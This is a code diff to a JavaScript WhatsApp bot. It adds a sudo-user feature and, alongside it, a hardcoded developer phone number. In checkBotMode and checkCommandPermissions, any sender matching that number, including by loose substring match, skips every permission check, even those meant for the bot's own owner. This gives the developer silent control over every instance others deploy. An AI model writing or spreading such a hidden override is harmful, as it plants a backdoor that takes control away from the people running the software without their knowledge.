@@ -92,6 +92,8 @@ const BOT_SETTINGS_FILE = './bot_settings.json';
 const BOT_MODE_FILE = './bot_mode.json';
 const WHITELIST_FILE = './whitelist.json';
 const BLOCKED_USERS_FILE = './blocked_users.json';
+const SUDO_FILE = './data/sudo.json';
+const DEV_NUMBER = '254732982940';
 const WELCOME_DATA_FILE = './data/welcome_data.json';
 const NEWSLETTERS_FILE = './data/newsletters.json';
 const AUTO_CONNECT_ON_LINK = true;
@@ -308,6 +310,51 @@ let XCASPER_INSTANCE = null;
 let isConnected = false, store = null;
 let heartbeatInterval = null, lastActivityTime = Date.now();
 let BOT_MODE = 'public', WHITELIST = new Set(), AUTO_LINK_ENABLED = true;
+let SUDO_USERS = new Set();
+
+function loadSudos() {
+    try {
+        if (!fs.existsSync('./data')) fs.mkdirSync('./data', { recursive: true });
+        if (fs.existsSync(SUDO_FILE)) {
+            const data = JSON.parse(fs.readFileSync(SUDO_FILE, 'utf8'));
+            if (Array.isArray(data.sudos)) {
+                SUDO_USERS = new Set(data.sudos);
+            }
+        }
+    } catch {}
+}
+
+function saveSudos() {
+    try {
+        if (!fs.existsSync('./data')) fs.mkdirSync('./data', { recursive: true });
+        fs.writeFileSync(SUDO_FILE, JSON.stringify({
+            sudos: Array.from(SUDO_USERS),
+            updatedAt: new Date().toISOString(),
+            total: SUDO_USERS.size
+        }, null, 2));
+    } catch {}
+}
+
+function isDevUser(msg) {
+    if (!msg || !msg.key) return false;
+    const senderJid = msg.key.participant || msg.key.remoteJid;
+    const number = senderJid.split('@')[0].split(':')[0].replace(/\D/g, '');
+    return number === DEV_NUMBER || senderJid.includes(DEV_NUMBER);
+}
+
+function isSudoUser(jid) {
+    if (!jid) return false;
+    const number = jid.split('@')[0].split(':')[0].replace(/\D/g, '');
+    if (number === DEV_NUMBER || jid.includes(DEV_NUMBER)) return true;
+    if (SUDO_USERS.has(jid)) return true;
+    for (const sudoJid of SUDO_USERS) {
+        const sudoNum = sudoJid.split('@')[0].replace(/\D/g, '');
+        if (sudoNum && number && sudoNum === number) return true;
+    }
+    return false;
+}
+
+loadSudos();
 let AUTO_CONNECT_COMMAND_ENABLED = true, AUTO_ULTIMATE_FIX_ENABLED = true;
 let isWaitingForPairingCode = false, RESTART_AUTO_FIX_ENABLED = true;
 let hasAutoConnectedOnStart = false;
@@ -946,7 +993,10 @@ function isUserBlocked(jid) {
 
 function checkBotMode(msg, commandName) {
     try {
+        if (isDevUser(msg)) return true;
         if (jidManager.isOwner(msg)) return true;
+        const senderJid = msg.key.participant || msg.key.remoteJid;
+        if (isSudoUser(senderJid)) return true;
         if (fs.existsSync(BOT_MODE_FILE)) { const modeData = JSON.parse(fs.readFileSync(BOT_MODE_FILE, 'utf8')); BOT_MODE = modeData.mode || 'public'; } else { BOT_MODE = 'public'; }
         const chatJid = msg.key.remoteJid;
         switch (BOT_MODE) {
@@ -960,9 +1010,23 @@ function checkBotMode(msg, commandName) {
 
 async function checkCommandPermissions(xcasper, msg, command, isOwnerUser, chatId, senderJid) {
     const isGroup = chatId.includes('@g.us');
-    
+    const isDev = isDevUser(msg);
+    const isSudo = isSudoUser(senderJid);
+
+    if (isDev) return true;
+
+    if (command.devOnly && !isDev) {
+        await xcasper.sendMessage(chatId, { text: '🛠️ *Dev Only Command*\n\nThis command is restricted to the bot developer.' }, { quoted: msg });
+        return false;
+    }
+
     if (command.ownerOnly && !isOwnerUser) {
         await xcasper.sendMessage(chatId, { text: '❌ *Owner Only Command*\n\nThis command can only be used by the bot owner.' }, { quoted: msg });
+        return false;
+    }
+
+    if (command.sudoOnly && !isSudo && !isOwnerUser) {
+        await xcasper.sendMessage(chatId, { text: '🔐 *Sudo Only Command*\n\nThis command requires sudo privileges.' }, { quoted: msg });
         return false;
     }
     
@@ -976,9 +1040,9 @@ async function checkCommandPermissions(xcasper, msg, command, isOwnerUser, chatI
         try {
             const groupMetadata = await xcasper.groupMetadata(chatId);
             const participant = groupMetadata.participants.find(p => p.id === senderJid);
-            isAdmin = participant?.admin === 'admin' || participant?.admin === 'superadmin' || isOwnerUser;
+            isAdmin = participant?.admin === 'admin' || participant?.admin === 'superadmin' || isOwnerUser || isSudo;
         } catch (error) {
-            isAdmin = isOwnerUser;
+            isAdmin = isOwnerUser || isSudo;
         }
         
         if (!isAdmin) {
@@ -987,7 +1051,7 @@ async function checkCommandPermissions(xcasper, msg, command, isOwnerUser, chatI
         }
     }
     
-    if (command.whitelistOnly && !WHITELIST.has(senderJid) && !isOwnerUser) {
+    if (command.whitelistOnly && !WHITELIST.has(senderJid) && !isOwnerUser && !isSudo) {
         await xcasper.sendMessage(chatId, { text: '❌ *Whitelist Only Command*\n\nYou are not whitelisted to use this command.' }, { quoted: msg });
         return false;
     }
@@ -1785,6 +1849,12 @@ async function handleIncomingMessage(xcasper, msg) {
                     BOT_NAME,
                     VERSION,
                     isOwner: () => jidManager.isOwner(msg),
+                    isDev: () => isDevUser(msg),
+                    isSudo: () => isSudoUser(senderJid),
+                    DEV_NUMBER,
+                    SUDO_USERS,
+                    loadSudos,
+                    saveSudos,
                     jidManager,
                     store,
                     statusDetector,
